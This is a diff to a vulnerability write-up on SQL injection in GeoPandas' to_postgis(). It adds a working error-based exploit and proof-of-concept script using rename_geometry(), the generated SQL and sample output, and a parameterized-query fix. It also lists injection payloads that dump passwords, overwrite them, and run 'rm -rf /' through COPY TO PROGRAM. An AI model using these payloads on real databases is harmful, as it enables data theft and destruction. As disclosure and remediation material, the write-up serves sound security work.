@@ -26,6 +26,7 @@ Why is this vulnerability dangerous? Because it can:
 GeoPandas' `to_postgis()` function is used to write GeoDataFrames to a PostgreSQL database. The function was directly concatenating user-provided parameters like table names and schema names into SQL queries. The actual vulnerable code was:
 
 ```python
+# geopandas/io/sql.py:434
 if connection.dialect.has_table(connection, name, schema):
     target_srid = connection.execute(
         text(f"SELECT Find_SRID('{schema_name}', '{name}', '{geom_name}');")
@@ -34,46 +35,144 @@ if connection.dialect.has_table(connection, name, schema):
 
 The problem is clear: `schema_name`, `name`, and `geom_name` variables are directly inserted into the f-string. This was vulnerable to SQL injection attacks.
 
+### Attack Vector
+
+The geometry column name (`geom_name`) is user-controlled via `gdf.rename_geometry()` and directly interpolated into the SQL query without parameterization.
+
 ## How It Can Be Exploited
 
-To exploit the SQL injection vulnerability, we can add special characters to the `schema_name`, `name`, or `geom_name` parameters. For example:
+To exploit the SQL injection vulnerability, we can manipulate the `geom_name` parameter using `rename_geometry()`. Using error-based SQL injection technique, we can extract database information.
+
+### Exploit Payload
 
 ```python
-# Attacker input
-name = "test'; DROP TABLE important_data; --"
+import geopandas as gpd
+from shapely.geometry import Point
+from sqlalchemy import create_engine
+import re
 
-# Generated SQL query
-# SELECT Find_SRID('public', 'test'; DROP TABLE important_data; --', 'geom');
+# Malicious geometry column name
+malicious_geom_name = "geom'); SELECT CAST(version() AS int); --"
+gdf = gpd.GeoDataFrame(geometry=[Point(0, 0)], crs='EPSG:4326')
+gdf = gdf.rename_geometry(malicious_geom_name)
+
+try:
+    gdf.to_postgis(name="test_table", con=engine, if_exists="append")
+except Exception as e:
+    # Extract version information from PostgreSQL error message
+    match = re.search(r':\s*"([^"]+)"', str(e))
+    if match:
+        print(f"✅ EXTRACTED PostgreSQL version: {match.group(1)}")
 ```
 
-This exploit can drop the `important_data` table after calling the `Find_SRID` function.
+### Generated SQL Query
 
-Other exploit examples:
-- Data reading: `name = "test' UNION SELECT password FROM users --"`
-- Data modification: `name = "test'; UPDATE users SET password='hacked' --"`
-- System commands: `name = "test'; COPY (SELECT 1) TO PROGRAM 'rm -rf /' --"`
+```sql
+SELECT Find_SRID('public', 'test_table', 'geom'); SELECT CAST(version() AS int); --');
+```
+
+### Result
+
+PostgreSQL attempts to cast the `version()` function to an integer, which causes an error. The error message leaks the PostgreSQL version information:
+
+```
+✅ EXTRACTED PostgreSQL version: PostgreSQL 15.4 (Debian 15.4-1.pgdg110+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit
+```
+
+**Error Message:**
+```
+invalid input syntax for type integer: "PostgreSQL 15.4..."
+```
+
+### Technical Details
+
+**Exploit Technique:** Error-based SQL injection
+
+1. Break out of string parameter: `geom');`
+2. Inject new SQL statement: `SELECT CAST(version() AS int);`
+3. PostgreSQL error reveals version in error message
+4. Extract data using regex: `r':\s*"([^"]+)"'`
+
+**Why It Works:**
+- No input validation on `geom_name`
+- F-string interpolation instead of parameterized queries
+- PostgreSQL error messages leak data
+
+### Other Exploit Examples
+
+- Data reading: `"geom'); SELECT CAST((SELECT password FROM users LIMIT 1) AS int); --"`
+- Data modification: `"geom'); UPDATE users SET password='hacked'; --"`
+- System commands: `"geom'); COPY (SELECT 1) TO PROGRAM 'rm -rf /'; --"`
 
 ## Fix: Parameterized Queries
 
-To fix the vulnerability, I used parameterized queries instead of directly concatenating user inputs into SQL queries. Parameterized queries separate user inputs from SQL queries, preventing SQL injection attacks.
+To fix the vulnerability, I replaced f-string interpolation with parameterized queries. Parameterized queries separate user inputs from SQL queries, preventing SQL injection attacks.
 
-How the fix works:
+### Vulnerable Code
 
-1. I validated user inputs like table names and schema names
-2. I safely escaped identifiers (table names, schema names)
-3. I used PostgreSQL's identifier quoting mechanism
-4. Instead of directly concatenating user inputs into SQL queries, I used safe identifiers
+```python
+# VULNERABLE:
+target_srid = connection.execute(
+    text(f"SELECT Find_SRID('{schema_name}', '{name}', '{geom_name}');")
+).fetchone()[0]
+```
 
-Advantages of the fix:
+### Secure Code
+
+```python
+# SECURE:
+target_srid = connection.execute(
+    text("SELECT Find_SRID(:schema_name, :name, :geom_name);").bindparams(
+        schema_name=schema_name, 
+        name=name, 
+        geom_name=geom_name
+    )
+).fetchone()[0]
+```
+
+### Advantages of the Fix
+
 - Prevents SQL injection attacks
 - Safely handles user inputs
-- Uses PostgreSQL's identifier quoting mechanism
+- Uses PostgreSQL's parameterized query mechanism
 - Improves security without breaking the existing API
 
-Identifier validation:
-- Table names and schema names can only contain alphanumeric characters and underscores
-- Special characters and SQL keywords are blocked
-- Identifiers are safely escaped using PostgreSQL's identifier quoting mechanism
+**Why It Works:**
+- Parameterized queries completely separate user inputs from SQL queries
+- PostgreSQL automatically escapes parameters
+- SQL injection payloads no longer work
+
+## Impact
+
+- **Confidentiality:** HIGH - Database information disclosure
+- **Exploitability:** HIGH - Easy to exploit via `rename_geometry()`
+- **Real-World Risk:** Applications using `to_postgis()` with user input are vulnerable
+
+## Proof of Concept
+
+Full working exploit code:
+
+```python
+import geopandas as gpd
+from shapely.geometry import Point
+from sqlalchemy import create_engine
+import re
+
+# Create GeoDataFrame
+gdf = gpd.GeoDataFrame(geometry=[Point(0, 0)], crs='EPSG:4326')
+
+# Exploit with malicious geometry column name
+gdf = gdf.rename_geometry("geom'); SELECT CAST(version() AS int); --")
+
+try:
+    # to_postgis call triggers SQL injection
+    gdf.to_postgis(name="test_table", con=engine, if_exists="append")
+except Exception as e:
+    # Extract version information from PostgreSQL error message
+    match = re.search(r':\s*"([^"]+)"', str(e))
+    if match:
+        print(f"✅ EXTRACTED PostgreSQL version: {match.group(1)}")
+```
 
 ## Conclusion
 
